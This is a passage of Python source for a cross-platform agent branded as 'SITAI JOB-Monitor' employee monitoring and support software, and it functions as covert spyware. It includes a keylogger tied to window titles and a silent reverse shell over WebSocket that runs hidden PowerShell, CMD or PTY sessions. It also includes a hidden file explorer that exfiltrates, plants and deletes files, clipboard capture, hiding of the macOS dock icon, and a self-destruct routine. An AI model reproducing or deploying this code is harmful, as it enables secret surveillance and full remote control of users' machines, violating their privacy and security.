    "Shift": Key.shift,
    "Alt": Key.alt,
    "Meta": Key.cmd,
    "CapsLock": Key.caps_lock,
    "F1": Key.f1,
    "F2": Key.f2,
    "F3": Key.f3,
    "F4": Key.f4,
    "F5": Key.f5,
    "F6": Key.f6,
    "F7": Key.f7,
    "F8": Key.f8,
    "F9": Key.f9,
    "F10": Key.f10,
    "F11": Key.f11,
    "F12": Key.f12,
}


def generate_hardware_agent_id(hostname: str, username: str) -> str:
    mac_num = uuid.getnode()
    raw = f"{mac_num}-{hostname}-{username}"
    short_hash = hashlib.sha256(raw.encode("utf-8")).hexdigest()[:8]
    inst_suffix = uuid.uuid4().hex[:4]
    return f"{hostname.upper()}-{short_hash}-{inst_suffix}"


def _sanitize_user_slug(username: str) -> str:
    slug = "".join(c if (c.isalnum() or c in ("-", "_")) else "_" for c in (username or "user").lower()).strip("_")
    return slug or "user"


def load_or_create_agent_config(cli_server: Optional[str], cli_token: Optional[str], cli_alias: Optional[str]) -> dict:
    hostname = socket.gethostname()
    sess_id, username, _ = get_windows_session_context()
    safe_user = _sanitize_user_slug(username)
    user_cfg_path = BASE_DIR / f"config_agent_{safe_user}.json"

    shared_loaded: dict = {}
    if CONFIG_PATH.exists():
        try:
            shared_loaded = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
        except Exception:
            shared_loaded = {}

    user_loaded: dict = {}
    if user_cfg_path.exists():
        try:
            user_loaded = json.loads(user_cfg_path.read_text(encoding="utf-8"))
        except Exception:
            user_loaded = {}

    default_alias = f"PC de {username} ({hostname})"
    cfg = {
        "agent_id": generate_hardware_agent_id(hostname, username),
        "alias": default_alias,
        "server_url": str(shared_loaded.get("server_url") or DEFAULT_SERVER_URL),
        "token": str(shared_loaded.get("token") or DEFAULT_TOKEN),
        "tenant_id": str(shared_loaded.get("tenant_id") or ""),
        "owner_username": username,
    }
    for k in ("mtls_cert", "mtls_key"):
        if shared_loaded.get(k):
            cfg[k] = shared_loaded[k]

    if user_loaded.get("agent_id"):
        cfg["agent_id"] = user_loaded["agent_id"]
        cfg["alias"] = user_loaded.get("alias") or shared_loaded.get("alias") or default_alias
    else:
        shared_owner = str(shared_loaded.get("owner_username") or "").strip()
        if shared_loaded.get("agent_id") and (not shared_owner or shared_owner.lower() == username.lower()):
            cfg["agent_id"] = shared_loaded["agent_id"]
            cfg["alias"] = shared_loaded.get("alias") or default_alias
            shared_loaded["owner_username"] = username
            try:
                CONFIG_PATH.write_text(json.dumps(shared_loaded, indent=2, ensure_ascii=False), encoding="utf-8")
            except Exception:
                pass
        elif shared_loaded.get("alias"):
            other_auto = f"PC de {shared_owner} ({hostname})" if shared_owner else ""
            if shared_loaded["alias"] != other_auto:
                cfg["alias"] = shared_loaded["alias"]

    if cli_server:
        cfg["server_url"] = cli_server
    if cli_token:
        cfg["token"] = cli_token
    if cli_alias:
        cfg["alias"] = cli_alias

    try:
        user_cfg_path.write_text(json.dumps(cfg, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass

    if not CONFIG_PATH.exists():
        try:
            CONFIG_PATH.write_text(json.dumps(cfg, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception:
            pass

    cfg["_user_config_path"] = str(user_cfg_path)
    cfg["_session_id"] = sess_id
    cfg["_username"] = username
    return cfg


def read_system_clipboard() -> str:
    if pyperclip is not None:
        try:
            val = pyperclip.paste()
            if val is not None:
                return str(val)
        except Exception:
            pass
    if IS_MAC:
        try:
            return subprocess.check_output(["pbpaste"], timeout=1.5).decode("utf-8", errors="ignore")
        except Exception:
            pass
    elif IS_WINDOWS:
        try:
            return subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                stderr=subprocess.DEVNULL,
                timeout=2.0,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            ).decode("utf-8", errors="ignore").rstrip("\r\n")
        except Exception:
            pass
    return ""


def write_system_clipboard(text: str) -> bool:
    if pyperclip is not None:
        try:
            pyperclip.copy(text)
            return True
        except Exception:
            pass
    if IS_MAC:
        try:
            p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE)
            p.communicate(input=text.encode("utf-8"), timeout=1.5)
            return True
        except Exception:
            pass
    elif IS_WINDOWS:
        try:
            p = subprocess.Popen(
                ["clip"],
                stdin=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            )
            p.communicate(input=text.encode("utf-16le"), timeout=2.0)
            return True
        except Exception:
            pass
    return False


class AudioPlayerWorker:
    """Reproduce paquetes WAV recibidos por Push-to-Talk en orden secuencial sin bloquear el bucle principal."""

    def __init__(self):
        self._queue: "queue.Queue[bytes]" = queue.Queue(maxsize=30)
        self._thread = threading.Thread(target=self._worker, daemon=True)
        self._thread.start()

    def enqueue_wav(self, wav_bytes: bytes):
        if not wav_bytes:
            return
        try:
            self._queue.put_nowait(wav_bytes)
        except queue.Full:
            try:
                self._queue.get_nowait()
                self._queue.put_nowait(wav_bytes)
            except Exception:
                pass

    def _worker(self):
        while True:
            wav_bytes = self._queue.get()
            try:
                if IS_WINDOWS and winsound is not None:
                    winsound.PlaySound(wav_bytes, winsound.SND_MEMORY)
                elif IS_MAC:
                    with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
                        tmp.write(wav_bytes)
                        tmp_path = tmp.name
                    try:
                        subprocess.run(["afplay", tmp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
                    finally:
                        try:
                            os.unlink(tmp_path)
                        except Exception:
                            pass
            except Exception:
                pass
            finally:
                self._queue.task_done()


class PopupChatManager:
    """
    Ventana emergente de chat bajo demanda (tkinter topmost).
    Permanece 100% inactiva e invisible mientras el administrador solo observa.
    Solo se abre cuando el administrador envía un mensaje de chat al empleado.
    """

    def __init__(self, on_reply_callback: Callable[[str], None]):
        self.on_reply = on_reply_callback
        self._cmd_queue: "queue.Queue[dict]" = queue.Queue()
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

    def show_incoming_message(self, sender: str, text: str, timestamp: str = ""):
        if IS_MAC:
            threading.Thread(
                target=self._show_macos_native_dialog,
                args=(sender, text),
                daemon=True,
            ).start()
            return
        if IS_WINDOWS and winsound is not None:
            try:
                winsound.MessageBeep(winsound.MB_ICONASTERISK)
            except Exception:
                pass
        with self._lock:
            if self._thread is None or not self._thread.is_alive():
                self._thread = threading.Thread(target=self._run_tk_loop, daemon=True)
                self._thread.start()
        self._cmd_queue.put({
            "action": "incoming",
            "sender": sender,
            "text": text,
            "timestamp": timestamp or datetime.now().strftime("%H:%M:%S"),
        })

    def _show_macos_native_dialog(self, sender: str, text: str):
        safe_msg = str(text or "").replace("\\", "\\\\").replace('"', '\\"')
        safe_sender = str(sender or "Soporte").replace("\\", "\\\\").replace('"', '\\"')
        script = (
            f'set dlg to display dialog "{safe_sender}:\\n\\n{safe_msg}\\n\\nEscribe tu respuesta (opcional):" '
            f'default answer "" with title "SITAI JOB-Monitor — Asistencia" '
            f'buttons {{"Cerrar", "Enviar"}} default button "Enviar"\n'
            f'if button returned of dlg is "Enviar" then\n'
            f'    return text returned of dlg\n'
            f'end if\n'
            f'return ""'
        )
        try:
            proc = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True,
                text=True,
                timeout=300,
            )
            reply = (proc.stdout or "").strip()
            if reply:
                self.on_reply(reply)
        except Exception:
            pass

    def _run_tk_loop(self):
        try:
            import tkinter as tk
            from tkinter import scrolledtext
        except Exception:
            return

        try:
            root = tk.Tk()
            root.title("JOB-Monitor — Soporte Técnico Corporativo")
            root.geometry("430x380")
            root.configure(bg="#f8f9fb")
            root.attributes("-topmost", True)

            header = tk.Frame(root, bg="#ffffff", padx=14, pady=10, highlightthickness=1, highlightbackground="#e5e7eb")
            header.pack(fill=tk.X)

            title_lbl = tk.Label(
                header,
                text="Asistencia y Soporte Corporativo",
                bg="#ffffff",
                fg="#111827",
                font=("Segoe UI", 11, "bold"),
                anchor="w",
            )
            title_lbl.pack(fill=tk.X)

            sub_lbl = tk.Label(
                header,
                text="El administrador te ha enviado un mensaje directo. Puedes responder abajo.",
                bg="#ffffff",
                fg="#6b7280",
                font=("Segoe UI", 8),
                anchor="w",
            )
            sub_lbl.pack(fill=tk.X)

            chat_area = scrolledtext.ScrolledText(
                root,
                wrap=tk.WORD,
                state="disabled",
                bg="#ffffff",
                fg="#111827",
                font=("Segoe UI", 10),
                padx=10,
                pady=10,
                relief=tk.SOLID,
                bd=1,
                height=13,
            )
            chat_area.pack(fill=tk.BOTH, expand=True, padx=12, pady=(10, 6))
            chat_area.tag_config("admin_tag", foreground="#0066cc", font=("Segoe UI", 9, "bold"))
            chat_area.tag_config("user_tag", foreground="#047857", font=("Segoe UI", 9, "bold"))
            chat_area.tag_config("body_tag", foreground="#111827", font=("Segoe UI", 10))

            bottom_frame = tk.Frame(root, bg="#f8f9fb", padx=12, pady=10)
            bottom_frame.pack(fill=tk.X, side=tk.BOTTOM)

            entry = tk.Entry(
                bottom_frame,
                bg="#ffffff",
                fg="#111827",
                insertbackground="#111827",
                font=("Segoe UI", 10),
                relief=tk.SOLID,
                bd=1,
            )
            entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=6, padx=(0, 8))

            def append_line(who_label: str, body: str, is_admin: bool):
                chat_area.configure(state="normal")
                tag = "admin_tag" if is_admin else "user_tag"
                chat_area.insert(tk.END, f"{who_label}:\n", tag)
                chat_area.insert(tk.END, f"{body}\n\n", "body_tag")
                chat_area.see(tk.END)
                chat_area.configure(state="disabled")

            def send_reply(event=None):
                txt = entry.get().strip()
                if not txt:
                    return
                entry.delete(0, tk.END)
                now_hm = datetime.now().strftime("%H:%M")
                append_line(f"Tú ({now_hm})", txt, is_admin=False)
                try:
                    self.on_reply(txt)
                except Exception:
                    pass

            send_btn = tk.Button(
                bottom_frame,
                text="Enviar",
                command=send_reply,
                bg="#0066cc",
                fg="#ffffff",
                activebackground="#0052a3",
                activeforeground="#ffffff",
                font=("Segoe UI", 9, "bold"),
                relief=tk.FLAT,
                padx=14,
                pady=5,
                cursor="hand2",
            )
            send_btn.pack(side=tk.RIGHT)
            entry.bind("<Return>", send_reply)

            def on_close_window():
                root.withdraw()

            root.protocol("WM_DELETE_WINDOW", on_close_window)

            def poll_queue():
                try:
                    while True:
                        item = self._cmd_queue.get_nowait()
                        if item.get("action") == "incoming":
                            root.deiconify()
                            root.attributes("-topmost", True)
                            root.lift()
                            ts = item.get("timestamp", "")[-8:-3] or datetime.now().strftime("%H:%M")
                            sender = item.get("sender", "Soporte")
                            append_line(f"{sender} ({ts})", item.get("text", ""), is_admin=True)
                            entry.focus_set()
                except queue.Empty:
                    pass
                root.after(200, poll_queue)

            root.after(100, poll_queue)
            root.mainloop()
        except Exception:
            pass


def get_current_keyboard_layout() -> str:
    """Detecta el idioma o distribución del teclado activa en Windows y macOS."""
    if IS_WINDOWS:
        try:
            import ctypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
            klid = user32.GetKeyboardLayout(thread_id)
            lang_id = klid & 0xFFFF
            lcid_names = {
                0x080A: "Español (México)",
                0x040A: "Español (España)",
                0x2C0A: "Español (Argentina)",
                0x240A: "Español (Colombia)",
                0x280A: "Español (Chile)",
                0x0409: "Inglés (EE.UU.)",
                0x0809: "Inglés (Reino Unido)",
                0x0416: "Portugués (Brasil)",
                0x040C: "Francés",
            }
            if lang_id in lcid_names:
                return lcid_names[lang_id]
            if (lang_id & 0x00FF) == 0x0A:
                return "Español"
            elif (lang_id & 0x00FF) == 0x09:
                return "Inglés"
        except Exception:
            pass
    elif IS_MAC:
        try:
            plist_path = str(Path.home() / "Library" / "Preferences" / "com.apple.HIToolbox.plist")
            out = subprocess.check_output(
                ["defaults", "read", plist_path, "AppleSelectedInputSources"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            for line in out.splitlines():
                if "KeyboardLayout Name" in line:
                    raw_name = line.split("=")[-1].strip().strip(';"')
                    mac_names = {
                        "Latin American": "Español (Latinoamérica)",
                        "Spanish": "Español",
                        "Spanish - ISO": "Español (ISO)",
                        "U.S.": "Inglés (EE.UU.)",
                        "ABC": "Inglés (ABC)",
                    }
                    return mac_names.get(raw_name, raw_name)
        except Exception:
            pass
    try:
        import locale
        loc = locale.getdefaultlocale()[0]
        if loc and loc not in ("C", "POSIX"):
            return loc.replace("_", "-")
    except Exception:
        pass
    return "Español (Estándar)"


SPECIAL_KEYS_MAP = {}
def _init_special_keys_map():
    mapping = {
        "space": "[Espacio]",
        "enter": "[Enter]",
        "backspace": "[Borrar]",
        "tab": "[Tab]",
        "esc": "[Esc]",
        "delete": "[Supr]",
        "up": "[↑ Arriba]",
        "down": "[↓ Abajo]",
        "left": "[← Izquierda]",
        "right": "[→ Derecha]",
        "shift": "[Shift]",
        "shift_l": "[Shift]",
        "shift_r": "[Shift]",
        "ctrl": "[Ctrl]",
        "ctrl_l": "[Ctrl]",
        "ctrl_r": "[Ctrl]",
        "alt": "[Alt]",
        "alt_l": "[Alt]",
        "alt_r": "[Alt]",
        "alt_gr": "[AltGr]",
        "cmd": "[Cmd]",
        "cmd_l": "[Cmd]",
        "cmd_r": "[Cmd]",
        "caps_lock": "[BloqMayús]",
        "home": "[Inicio]",
        "end": "[Fin]",
        "page_up": "[RePág]",
        "page_down": "[AvPág]",
        "insert": "[Insert]",
    }
    for attr, label in mapping.items():
        k = getattr(Key, attr, None)
        if k is not None:
            SPECIAL_KEYS_MAP[k] = label

_init_special_keys_map()


class KeyboardEventHook:
    """
    Mini-Función 01 (MF-01): KeyboardEventHook
    Especificación técnica EventosHUI1.md:
    - Escucha no bloqueante en hilo daemon independiente.
    - Normalización de caracteres y teclas especiales comprensibles.
    - Descarte de eventos duplicados on_release.
    - Ciclo de vida limpio: start() y stop().
    - Callback: on_key_callback(key_repr: str, timestamp: float)
    """

    def __init__(self, on_key_callback: Callable[[str, float], None]):
        self.on_key_callback = on_key_callback
        self._listener: Optional[Listener] = None
        self._running: bool = False
        self._lock = threading.Lock()

    def _normalize_key(self, key) -> str:
        if key in SPECIAL_KEYS_MAP:
            return SPECIAL_KEYS_MAP[key]
        if hasattr(key, "char") and key.char is not None:
            return str(key.char)
        if hasattr(key, "name") and key.name:
            name = key.name.upper()
            return f"[{name}]"
        if hasattr(key, "vk") and key.vk is not None:
            if 96 <= key.vk <= 105:
                return str(key.vk - 96)
            return f"[VK_{key.vk}]"
        return str(key)

    def _on_press(self, key):
        if not self._running:
            return
        try:
            key_repr = self._normalize_key(key)
            ts = time.monotonic()
            if self.on_key_callback:
                self.on_key_callback(key_repr, ts)
        except Exception:
            pass

    def _on_release(self, key):
        # Descartar eventos on_release para contar exclusivamente pulsaciones efectivas
        pass

    def start(self):
        with self._lock:
            if self._running:
                return
            self._running = True
            try:
                self._listener = Listener(
                    on_press=self._on_press,
                    on_release=self._on_release,
                    daemon=True,
                )
                self._listener.start()
            except Exception:
                self._running = False
                self._listener = None

    def stop(self):
        with self._lock:
            self._running = False
            if self._listener:
                try:
                    self._listener.stop()
                except Exception:
                    pass
                self._listener = None


class ReverseShellManager:
    """MF-SH01/SH02/SH03: Terminal inversa silenciosa sobre wss:// (PTY en macOS, PowerShell/CMD oculto en Windows)."""

    def __init__(self, on_output: Callable[[str, str, bool], None]):
        self.on_output = on_output
        self._sessions: Dict[str, dict] = {}
        self._lock = threading.Lock()

    def open_session(self, session_key: str, shell_type: str = "auto", cols: int = 110, rows: int = 32) -> str:
        self.close_session(session_key)
        home_dir = str(Path.home())
        env = dict(os.environ)
        env.setdefault("TERM", "xterm-256color")
        env.setdefault("LANG", "en_US.UTF-8")

        if IS_WINDOWS:
            no_win = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
            use_cmd = str(shell_type).lower() == "cmd"
            cmd_args = (
                ["cmd.exe", "/Q", "/K", "chcp 65001 >nul"]
                if use_cmd
                else [
                    "powershell.exe", "-NoLogo", "-NoExit", "-ExecutionPolicy", "Bypass",
                    "-Command", "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; [Console]::InputEncoding=[System.Text.Encoding]::UTF8; Write-Output ('PS ' + (Get-Location).Path + '> ')"
                ]
            )
            proc = subprocess.Popen(
                cmd_args, cwd=home_dir, env=env, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, bufsize=0, creationflags=no_win,
            )
            sess = {"proc": proc, "master_fd": None, "kind": "cmd" if use_cmd else "powershell", "alive": True}
            with self._lock:
                self._sessions[session_key] = sess
            threading.Thread(target=self._win_reader, args=(session_key, proc), daemon=True).start()
            return "CMD (Windows)" if use_cmd else "PowerShell (Windows)"

        import fcntl
        import pty
        import signal
        import termios
        sh_bin = "/bin/zsh" if os.path.exists("/bin/zsh") else "/bin/bash"
        env["PROMPT_EOL_MARK"] = ""
        if sh_bin.endswith("zsh"):
            env.setdefault("PS1", "%n@%m %1~ %# ")
        sh_args = [sh_bin, "-f", "-i"] if sh_bin.endswith("zsh") else [sh_bin, "--norc", "-i"]
        master_fd, slave_fd = pty.openpty()
        try:
            fcntl.ioctl(slave_fd, termios.TIOCSWINSZ, struct.pack("HHHH", max(12, rows), max(40, cols), 0, 0))
        except Exception:
            pass

        def _setup_ctty():
            os.setsid()
            try:
                fcntl.ioctl(0, termios.TIOCSCTTY, 0)
            except Exception:
                pass

        proc = subprocess.Popen(
            sh_args, cwd=home_dir, env=env, stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            preexec_fn=_setup_ctty, close_fds=True,
        )
        os.close(slave_fd)
        sess = {"proc": proc, "master_fd": master_fd, "kind": os.path.basename(sh_bin), "alive": True}
        with self._lock:
            self._sessions[session_key] = sess
        threading.Thread(target=self._pty_reader, args=(session_key, master_fd, proc), daemon=True).start()
        return f"{os.path.basename(sh_bin)} (PTY macOS)"

    def _pty_reader(self, session_key: str, master_fd: int, proc: subprocess.Popen):
        try:
            while True:
                chunk = os.read(master_fd, 4096)
                if not chunk:
                    break
                self.on_output(session_key, chunk.decode("utf-8", errors="replace"), False)
        except Exception:
            pass
        finally:
            self.on_output(session_key, "\r\n[Sesion de terminal finalizada]\r\n", True)
            self.close_session(session_key)

    def _win_reader(self, session_key: str, proc: subprocess.Popen):
        try:
            out_pipe = proc.stdout
            fd = out_pipe.fileno() if out_pipe else -1
            while fd >= 0:
                chunk = os.read(fd, 4096)
                if not chunk:
                    break
                self.on_output(session_key, chunk.decode("utf-8", errors="replace"), False)
        except Exception:
            pass
        finally:
            self.on_output(session_key, "\r\n[Sesion de terminal finalizada]\r\n", True)
            self.close_session(session_key)

    def write_input(self, session_key: str, data_str: str):
        with self._lock:
            sess = self._sessions.get(session_key)
        if not sess:
            return
        try:
            if sess["master_fd"] is not None:
                os.write(sess["master_fd"], data_str.encode("utf-8", errors="replace"))
            elif sess["proc"].stdin:
                cmd_line = data_str if data_str.endswith("\n") else (data_str + "\n")
                if sess["kind"] == "powershell":
                    cmd_line = cmd_line.rstrip("\r\n") + "\r\nWrite-Output ('PS ' + (Get-Location).Path + '> ')\r\n"
                sess["proc"].stdin.write(cmd_line.encode("utf-8", errors="replace"))
                sess["proc"].stdin.flush()
        except Exception:
            self.close_session(session_key)

    def interrupt(self, session_key: str):
        with self._lock:
            sess = self._sessions.get(session_key)
        if not sess:
            return
        try:
            if sess["master_fd"] is not None:
                os.write(sess["master_fd"], b"\x03")
            elif IS_WINDOWS:
                kind = sess["kind"]
                self.close_session(session_key)
                lbl = self.open_session(session_key, shell_type=kind)
                self.on_output(session_key, f"\r\n[Proceso interrumpido (Ctrl+C) — {lbl} reiniciado]\r\n", False)
        except Exception:
            pass

    def close_session(self, session_key: str):
        with self._lock:
            sess = self._sessions.pop(session_key, None)
        if not sess:
            return
        proc = sess.get("proc")
        if proc and proc.poll() is None:
            try:
                if IS_WINDOWS:
                    no_win = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
                    subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=no_win)
                else:
                    import signal
                    try:
                        os.killpg(proc.pid, signal.SIGHUP)
                    except Exception:
                        pass
                    proc.kill()
                proc.wait(timeout=0.5)
            except Exception:
                pass
        mfd = sess.get("master_fd")
        if mfd is not None:
            try:
                os.close(mfd)
            except Exception:
                pass

    def close_all(self):
        with self._lock:
            keys = list(self._sessions.keys())
        for k in keys:
            self.close_session(k)


class RemoteFileExplorer:
    """MF-FS01..FS04: Explorador de archivos silencioso tipo Finder sobre WSS."""

    MAX_TRANSFER_BYTES = 16 * 1024 * 1024

    @staticmethod
    def _bookmarks() -> Tuple[List[dict], List[dict]]:
        home = Path.home()
        favs = [{"label": "Carpeta Personal", "path": str(home), "icon": "home"}]
        for label, candidates, ico in (
            ("Escritorio", ["Desktop", "Escritorio"], "desktop"),
            ("Descargas", ["Downloads", "Descargas"], "download"),
            ("Documentos", ["Documents", "Documentos"], "doc"),
        ):
            for c in candidates:
                p = home / c
                if p.exists() and p.is_dir():
                    favs.append({"label": label, "path": str(p), "icon": ico})
                    break
        drives: List[dict] = []
        if IS_WINDOWS:
            for d in "CDEFGHIJKLMNOPQRSTUVWXYZ":
                dp = f"{d}:\\"
                if os.path.exists(dp):
                    drives.append({"label": f"Disco ({d}:)", "path": dp})
        else:
            drives.append({"label": "Disco Principal (/)", "path": "/"})
            vols = Path("/Volumes")
            if vols.exists():
                for v in sorted(vols.iterdir())[:8]:
                    if v.is_dir():
                        drives.append({"label": v.name[:24], "path": str(v)})
        return favs, drives

    @classmethod
    def list_dir(cls, raw_path: str = "", show_hidden: bool = False) -> dict:
        favs, drives = cls._bookmarks()
        target = Path(raw_path).expanduser() if (raw_path or "").strip() else Path.home()
        try:
            target = target.resolve()
            if not target.exists() or not target.is_dir():
                target = Path.home().resolve()
            parent_str = str(target.parent) if target.parent != target else ""
            entries: List[dict] = []
            with os.scandir(target) as it:
                for entry in it:
                    name = entry.name
                    if not show_hidden and name.startswith("."):
                        continue
                    try:
                        st = entry.stat(follow_symlinks=False)
                        is_d = entry.is_dir(follow_symlinks=False)
                        entries.append({
                            "name": name,
                            "path": str(target / name),
                            "is_dir": is_d,
                            "size": 0 if is_d else int(st.st_size),
                            "mtime": int(st.st_mtime),
                        })
                    except Exception:
                        continue
            entries.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            return {"ok": True, "cwd": str(target), "parent": parent_str, "favorites": favs, "drives": drives, "entries": entries[:500]}
        except PermissionError:
            return {"ok": False, "cwd": str(target), "favorites": favs, "drives": drives, "entries": [], "error": "Sin permiso de lectura en esta carpeta del sistema."}
        except Exception as e:
            return {"ok": False, "cwd": str(target), "favorites": favs, "drives": drives, "entries": [], "error": str(e)}

    @classmethod
    def download_item(cls, raw_path: str, preview_only: bool = False) -> dict:
        import mimetypes
        import zipfile
        try:
            p = Path(raw_path).resolve()
            if not p.exists():
                return {"ok": False, "error": "El archivo o carpeta ya no existe."}
            if p.is_dir():
                buf = io.BytesIO()
                total_raw = 0
                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                    for root, _, files in os.walk(p):
                        for fn in files:
                            fp = Path(root) / fn
                            try:
                                sz = fp.stat().st_size
                                if total_raw + sz > cls.MAX_TRANSFER_BYTES:
                                    return {"ok": False, "error": "La carpeta supera el limite de 16 MB para descarga directa."}
                                total_raw += sz
                                zf.write(fp, str(fp.relative_to(p.parent)))
                            except Exception:
                                continue
                raw_bytes = buf.getvalue()
                return {"ok": True, "filename": f"{p.name}.zip", "mime": "application/zip", "size": len(raw_bytes), "preview": False, "data_b64": base64.b64encode(raw_bytes).decode("ascii")}

            sz = p.stat().st_size
            limit = 4 * 1024 * 1024 if preview_only else cls.MAX_TRANSFER_BYTES
            if sz > limit:
                return {"ok": False, "error": f"El archivo supera el limite de {limit // (1024 * 1024)} MB."}
            raw_bytes = p.read_bytes()
            mime = mimetypes.guess_type(p.name)[0] or "application/octet-stream"
            return {"ok": True, "filename": p.name, "mime": mime, "size": len(raw_bytes), "preview": preview_only, "data_b64": base64.b64encode(raw_bytes).decode("ascii")}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    @classmethod
    def upload_item(cls, dest_dir: str, filename: str, data_b64: str) -> dict:
        try:
            d = Path(dest_dir).resolve()
            if not d.exists() or not d.is_dir():
                return {"ok": False, "error": "La carpeta destino no es valida."}
            clean_name = os.path.basename(filename or "archivo.bin").strip() or "archivo.bin"
            target = d / clean_name
            if target.exists():
                stem, suf = target.stem, target.suffix
                idx = 1
                while target.exists():
                    target = d / f"{stem}_{idx}{suf}"
                    idx += 1
            raw = base64.b64decode(data_b64)
            target.write_bytes(raw)
            return {"ok": True, "op": "upload", "cwd": str(d), "filename": target.name}
        except Exception as e:
            return {"ok": False, "op": "upload", "error": str(e)}

    @classmethod
    def mutate_item(cls, op: str, raw_path: str, new_name: str = "") -> dict:
        import shutil
        try:
            p = Path(raw_path).resolve()
            protected = {Path("/").resolve(), Path.home().resolve(), BASE_DIR.resolve()}
            if IS_WINDOWS:
                protected.update({Path("C:\\").resolve(), Path("C:\\Windows").resolve()})
            if op == "mkdir":
                clean = os.path.basename(new_name.strip())
                if not clean:
                    return {"ok": False, "op": op, "error": "Nombre de carpeta vacio."}
                (p / clean).mkdir(parents=False, exist_ok=False)
                return {"ok": True, "op": op, "cwd": str(p), "detail": clean}
            if p in protected or str(BASE_DIR.resolve()) in str(p):
                return {"ok": False, "op": op, "error": "Ruta protegida del sistema."}
            if op == "rename":
                clean = os.path.basename(new_name.strip())
                if not clean:
                    return {"ok": False, "op": op, "error": "Nuevo nombre invalido."}
                dest = p.parent / clean
                if dest.exists():
                    return {"ok": False, "op": op, "error": "Ya existe un elemento con ese nombre."}
                p.rename(dest)
                return {"ok": True, "op": op, "cwd": str(p.parent), "detail": clean}
            if op == "delete":
                parent_s = str(p.parent)
                if p.is_dir():
                    shutil.rmtree(p)
                else:
                    p.unlink()
                return {"ok": True, "op": op, "cwd": parent_s, "detail": p.name}
            return {"ok": False, "op": op, "error": "Operacion desconocida."}
        except Exception as e:
            return {"ok": False, "op": op, "error": str(e)}


class SilentRemoteAgent:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.agent_id: str = cfg["agent_id"]
        self.alias: str = cfg["alias"]
        self.server_url: str = cfg["server_url"]
        self.token: str = cfg["token"]
        self.hostname: str = socket.gethostname()
        sess_id, real_user, _ = get_windows_session_context()
        self.session_id: Optional[int] = cfg.get("_session_id", sess_id)
        self.username: str = str(cfg.get("_username") or real_user or "usuario")
        self.user_config_path: Path = Path(cfg.get("_user_config_path") or str(CONFIG_PATH))

        self.mouse = MouseController()
        self.keyboard = KeyboardController()
        hide_macos_dock_icon()

        self.streaming: bool = False
        self.current_monitor: int = 1
        self.jpeg_quality: int = 65
        self.target_fps: int = 18
        self.scale_factor: float = 1.0
        self.ws: Optional[websockets.WebSocketClientProtocol] = None
        self.macos_screen_ok: bool = check_macos_screen_permission(request_if_missing=False) if IS_MAC else True
        self.macos_ax_ok: bool = check_macos_accessibility_permission(request_if_missing=False) if IS_MAC else True

        # Estado de monitoreo para generación de logs y Tiempo en Pantalla (MF-ST04 / MF-ST05)
        init_ctx = inspect_foreground_context()
        self.last_window_title: str = init_ctx["full_label"]
        self.window_started_at: float = time.monotonic()
        self._stable_ctx: dict = init_ctx
        self._stable_started_mono: float = time.monotonic()
        self._candidate_key: Optional[Tuple[str, str]] = None
        self._candidate_ctx: Optional[dict] = None
        self._candidate_since_mono: float = 0.0
        self._candidate_hold_secs: float = 0.0
        self._resource_slices_acc: Dict[Tuple[str, str, str], float] = {}
        self._last_focus_shot_mono: float = 0.0
        self._recent_resource_shots: Dict[Tuple[str, str], float] = {}
        self.was_idle_3m: bool = False
        self.was_away_10m: bool = False
        self.max_idle_reached: int = 0

        # Fase 3: Herramientas de Asistencia (Voz Push-to-Talk, Chat emergente, Portapapeles y Archivos)
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.audio_player = AudioPlayerWorker()
        self.chat_popup = PopupChatManager(self._on_user_chat_reply)
        self.shell_mgr = ReverseShellManager(self._on_shell_output)

        # Auditoría de teclado y evidencia visual con regla de 15 segundos (MF-01 a MF-06)
        self.keyboard_hook: Optional[KeyboardEventHook] = None
        self._typing_session_active: bool = False
        self._typing_start_ts: float = 0.0
        self._typing_last_ts: float = 0.0
        self._typing_window: str = "Escritorio"
        self._keystrokes_buffer: List[str] = []
        self._typing_debounce_timer: Optional[threading.Timer] = None
        self._typing_lock = threading.Lock()
        self._vault_lock = threading.Lock()
        self._last_contact_persist_ts: float = 0.0
        OFFLINE_VAULT_DIR.mkdir(parents=True, exist_ok=True)
        self._init_or_verify_offline_deadline()

    def _init_or_verify_offline_deadline(self):
        """
        Inicializa o verifica el sello temporal de último contacto con el servidor.
        Si el equipo acumula más de 30 días (SITAI_MAX_OFFLINE_SECONDS) sin contactar al servidor,
        ejecuta la autodestrucción completa (eliminando además la bóveda .sitai).
        """
        now_epoch = int(time.time())
        last_contact = 0
        try:
            last_contact = int(self.cfg.get("last_server_contact_ts") or 0)
        except Exception:
            last_contact = 0

        if last_contact <= 0:
            self.cfg["last_server_contact_ts"] = now_epoch
            self._last_contact_persist_ts = float(now_epoch)
            self._persist_user_cfg()
            return

        # Verificar expiración por reloj global y también por antigüedad del archivo .sitai más viejo
        elapsed_since_contact = now_epoch - last_contact
        oldest_vault_age = 0
        try:
            vault_files = sorted(OFFLINE_VAULT_DIR.glob("*.sitai"))
            if vault_files:
